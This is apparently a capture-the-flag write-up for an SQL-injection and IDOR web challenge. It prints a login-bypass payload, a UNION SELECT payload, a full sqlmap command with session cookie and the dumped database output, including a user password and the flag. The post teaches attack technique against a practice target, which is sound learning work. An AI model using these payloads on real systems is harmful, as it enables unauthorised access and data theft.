---
layout: post
title: The Lost Scroll Writeup
subtitle: ISSessions 2026 Fantasy CTF
thumbnail-img: /assets/img/issessionsfantasyctf26.jpg
share-img: /assets/img/issessions26-sqli-shop.png
image: /assets/img/issessions26-sqli-shop.png
tags: [ctf, writeup, sqli, idor]
author: Tina Ismail
---
<style>
    
    body{
        background-image:url(../assets/img/scroll.jpg);
        background-size:contain;
    }

.navbar, footer {
background-color:#d4a75f7F;
border:none;
box-shadow: 0 0 10px #d4a75f7F, 0 0 20px #d4a75f7F;
}
    p, h1, h2 {
        font-family: 'Palatino', 'Book Antiqua', 'Palatino Linotype', 'Georgia', 'Garamond', 'Times New Roman', serif;
        font-weight:bold;
    }
    .b3{
         font-family: Harrington, Papyrus;
        background-color: #d4a75f7F;
        color: #2b1a0f;
        box-shadow: 0 0 10px #d4a75f7F, 0 0 20px #d4a75f7F;
        border-radius:20px;
        text-align:center;
        padding:1%;
        margin-top:30px;
        font-weight:bold;
    }
    *{
        color:#2b1a0f;
    }
        /* Update your existing pre, code rule */
    pre, code, .highlight pre, .highlighter-rouge pre {
        color: white;
        background-color: black;
        padding: 1em;
        border-radius: 4px;
        overflow-x: auto;
    }

    /* Style inline code differently if needed */
    code {
        padding: 0.2em 0.4em;
        font-size: 85%;
    }

    /* Ensure code inside highlighted blocks is also styled */
    .highlight code, .highlighter-rouge code {
        background-color: transparent;
        color: white;
        padding: 0;
    }
    img{
        margin:auto;
    }

</style>

Greetings weary travellers! Settle down as I tell you my tale of epic intrigue. Few will believe my exploits but I swear they be true. Here you will learn of my forbidden methods.

We enter this portal of dubious origin. The description specifically mentions the username `slime001`, and the target URL has the string `sql-injection`. This leads me to believing there is a [SQL injection](https://portswigger.net/web-security/sql-injection) vulnerability in our midst.

![The Lost Scroll Challenge Discription](/assets/img/issessions26-sqli-desc.png)

<h2 class="b3">Vulnerable Login AKA Alohomora</h2>

<a class="image" href="https://xkcd.com/327/">![Exploits of a Mom](https://imgs.xkcd.com/comics/exploits_of_a_mom.png)</a>

Fellow merryfolk, I have something to confess: SQL Injections have always frustrated me. They have never come naturally to me, despite having completed multiple rooms on TryHackMe and having a decent understanding of SQL programming. But after this challenge, I have become quite comfortable with the theory and exploitation of this vulnerability. So lets begin!<br>

I set the username field to slime001, and attempt a SQL injection on the password field. This took me quite a while if I'm honest, since I was attempting more complicated methods using SQLMAP. I'm glad I read up on this tool, because although it did not aid me in this part of the challenge, it came in handy for the following part. At the end, the enchantment that did the trick was `' OR 1=1;--`. This effectively closes the password field prematurely with `'`, adds a condition `OR 1==1` that is always true which forces the database to return records even if the password is incorrect, ends the statement with `;`, and comments out the rest of the code using `--` to prevent compilation errors. After hitting the Submit Query button, we're off to part 2 of the challenge.<br>

![Login Page](/assets/img/issessions26-sqli.png)

<h2 class="b3">Mythical Shop AKA Show Me Your Wares</h2>

<h3>Exploiting IDOR</h3>

When we enter the shop's homepage, what sticks out to me are the awesome items on display. Having SQL injections fresh in mind, I'm wondering if we're seeing everything there is to offer at this fine establishment? More on that later.

![Slime001's Mythical Shop](/assets/img/issessions26-sqli-shop.png)

The second thing I notice is the username field in the URL. Perhaps an [IDOR](https://portswigger.net/web-security/access-control/idor) could be performed to enter another more advanced user's shop? After some fuzzing, I abandon this pursuit and proceed to analyzing the items more closely instead.

![Item 1](/assets/img/issessions26-item1.png)
![Item 2](/assets/img/issessions26-item2.png)
![Item 4](/assets/img/issessions26-item4.png)

Check out the URLs. Notice something off? It looks like item 3 is missing! I try inputting `3` in the URL but I get an error. What's really happening?<br>
![IDOR Attempt](/assets/img/issessions26-badrequest.png)

Well it's a subtle detail, but the key here is to change the `Origin` header to be the root path. This makes the application think that you're accessing the resource from clicking on it in the main shop dashboard, instead of just changing the path in the URL directly. Doing that, we get a `200 OK` and we can see the hidden contents of the page, plus the flag in the item description.



![Dragon Scroll](/assets/img/issessions26-idor200.png)

<h3>Solving the challenge using SQLMAP</h3>

There are a lot of cases where an application may not be vulnerable to IDOR, which means we need another tactic. Luckily for us, it looks like there's a search field. If you've been web hacking long enough your brain would immediately flag a search bar as a potential SQLi attack vector. These things are ripe for misuse when implemented poorly. Let's examine this using SQLMAP!


```bash
sqlmap -u "https://issessionsctf-sql-injection-challenge.chals.io/items/?search=1%3D%3D1" --cookie="session=eyJ1c2VyX2lkIjoxfQ.aZtS0w.ROwLPykA6ybPz7_UPr5jePYct6o" -p search -T items -a --batch
```

The output of this command is a long one, but if you bear with it it tells you all you need, including the true password for our user `slime001`.

```bash
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.9.11#stable}
|_ -| . ["]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 14:27:33 /2026-02-22/

[14:27:34] [INFO] resuming back-end DBMS 'sqlite' 
[14:27:34] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: search (GET)
    Type: UNION query
    Title: Generic UNION query (NULL) - 6 columns
    Payload: search=1==1' UNION ALL SELECT NULL,CONCAT(CONCAT('qvbqq','yCpDpAgbxuonsptNRjDKbHWXWLPIHlztpasPzCxX'),'qkvkq'),NULL,NULL,NULL,NULL-- JdIc
---
[14:27:35] [INFO] the back-end DBMS is SQLite
[14:27:35] [INFO] fetching banner
back-end DBMS: SQLite
banner: '3.46.1'
[14:27:35] [WARNING] on SQLite it is not possible to enumerate the current user
[14:27:35] [WARNING] on SQLite it is not possible to get name of the current database
[14:27:35] [WARNING] on SQLite it is not possible to enumerate the hostname
[14:27:35] [WARNING] on SQLite the current user has all privileges
current user is DBA: True
[14:27:35] [WARNING] on SQLite it is not possible to enumerate the users
[14:27:35] [WARNING] on SQLite it is not possible to enumerate the user password hashes
[14:27:35] [WARNING] on SQLite it is not possible to enumerate the user privileges
[14:27:35] [WARNING] on SQLite the concept of roles does not exist. sqlmap will enumerate privileges instead
[14:27:35] [WARNING] on SQLite it is not possible to enumerate the user privileges
[14:27:35] [INFO] sqlmap will dump entries of all tables from all databases now
[14:27:35] [INFO] fetching tables for database: 'SQLite_masterdb'
[14:27:35] [INFO] fetching columns for table 'sqlite_sequence' 
[14:27:35] [INFO] fetching entries for table 'sqlite_sequence'
Database: <current>
Table: sqlite_sequence
[2 entries]
+-----+-------+
| seq | name  |
+-----+-------+
| 4   | items |
| 1   | USERS |
+-----+-------+

[14:27:35] [INFO] table 'SQLite_masterdb.sqlite_sequence' dumped to CSV file '/home/att4ni/.local/share/sqlmap/output/issessionsctf-sql-injection-challenge.chals.io/dump/SQLite_masterdb/sqlite_sequence.csv'
[14:27:35] [INFO] fetching columns for table 'USERS' 
[14:27:35] [INFO] fetching entries for table 'USERS'
Database: <current>
Table: USERS
[1 entry]
+----+------------------------------------------------------------------+----------+
| id | password                                                         | username |
+----+------------------------------------------------------------------+----------+
| 1  | puasfpuinbinoraenpueanrp982y5023497239pupng9h))&$#)&$&#Yniqugn4i | slime001 |
+----+------------------------------------------------------------------+----------+

[14:27:35] [INFO] table 'SQLite_masterdb.USERS' dumped to CSV file '/home/att4ni/.local/share/sqlmap/output/issessionsctf-sql-injection-challenge.chals.io/dump/SQLite_masterdb/USERS.csv'
[14:27:35] [INFO] fetching columns for table 'items' 
[14:27:35] [INFO] fetching entries for table 'items'
Database: <current>
Table: items
[4 entries]
+----+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+------------------+--------------------------+-------+--------+
| id | info                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        | name             | image                    | price | hidden |
+----+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+------------------+--------------------------+-------+--------+
| 1  | A legendary weapon forged through magic or ancient ritual, its blade constantly engulfed in living fire. The flames do not consume the wielder but instead respond to their will, intensifying with emotion or combat prowess. Each strike scorches armor and flesh alike, leaving burning wounds and radiant trails of heat in the air. Often tied to elemental fire spirits, dragons, or lost civilizations, the sword is both a symbol of destructive power and a test of mastery, rewarding only those strong enough to control its blazing fury.                                                                                                                                                                                       | Sword of Flames  | images/red sword.png     | 1000  | 0      |
| 2  | A modestly enchanted blade shaped by natural forces rather than raw elemental power. Its magic is subtle, allowing the sword to remain sharp, resilient, and slightly enhanced by the vitality of the land it comes from. Vines, bark-like patterns, or faint green hues may trace the blade, and its strikes can cause minor effects such as accelerated decay of armor or brief rooting of enemies. Favored by rangers and travelers, the sword is practical and dependable, valued more for its steady usefulness and connection to the natural world than for overwhelming strength or spectacle.                                                                                                                                       | Sword of Nature  | images/green sword.png   | 500   | 0      |
| 3  | An ancient relic said to be penned in fire and scale by the first dragons at the dawn of magic. Its wyrm-hide parchment is etched with living runes that shift and rearrange themselves, revealing forbidden truths only to those clever—or reckless—enough to read between the lines. Legends claim the scroll does not grant power directly, but instead teaches how to bend the laws of magic, slipping commands into reality the way a rogue spell slips past a ward. Inscribed deep within its final ciphered verse lies the mark of its mastery, a phrase known to scholars and spellbreakers alike: FantasyCTF{qu3ry_th3_dr4g0n_scr0ll_0f_p0w3r}, a reminder that even the strongest systems can fall to a well-crafted incantation. | Dragon Scroll    | images/dragon scroll.png | 500   | 1      |
| 4  | A finely crafted blade imbued with the steady, relentless power of the ocean. Its magic is neither subtle nor overwhelming, manifesting in cool hues, faint mist, and a constant damp chill along the edge. The sword strikes with the weight of crashing waves, wearing down foes through persistence rather than sudden force, and its enchantment allows it to cut cleanly through armor and resist corrosion or breakage. Favored by sailors, coastal warriors, and tide-bound guardians, the sword embodies balance—strong and reliable, yet restrained—drawing its strength from the endless patience and quiet dominance of the sea.                                                                                                 | Sword of the Sea | images/blue sword.png    | 700   | 0      |
+----+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+------------------+--------------------------+-------+--------+

[14:27:36] [INFO] table 'SQLite_masterdb.items' dumped to CSV file '/home/att4ni/.local/share/sqlmap/output/issessionsctf-sql-injection-challenge.chals.io/dump/SQLite_masterdb/items.csv'
[14:27:36] [INFO] fetched data logged to text files under '/home/att4ni/.local/share/sqlmap/output/issessionsctf-sql-injection-challenge.chals.io'

[*] ending @ 14:27:36 /2026-02-22/
```
The flag is under the current database named `SQLite_masterdb` in the table `items`. Look closely, did you find it? Might be a bit tricky to make out, so lets modify the payload from above to visualize it on screen (optional). I input `1==1' UNION SELECT * FROM items--` into the search bar to query every item in the current database.<br>

![All Items](/assets/img/issessions26-allitems.png)

![Dragon Scroll](/assets/img/issessions26-dragonscroll.png)

<h2>
<details>
<summary>The Enchantment We Need</summary>

FantasyCTF{qu3ry_th3_dr4g0n_scr0ll_0f_p0w3r}

</details></h2>

<h2 class="b3">Special Acknowledgements</h2>

Thank you to TrendMicro and KPMG for your support this weekend! I learned a lot from the insights shared during the resume roast, and greatly enjoyed taking in the sights from the KPMG Toronto office (especially on such a foggy weekend)!<br>

Furthermore, I express my sincerest gratitude to the ISSessions Fantasy CTF team for organizing another successful CTF! Your dedication shines through, and the theme this year was most enjoyable. To Jamal, here's a [video](https://youtu.be/64myS6bmNsM) I think you should watch.

Cheers!<br>
Att4ni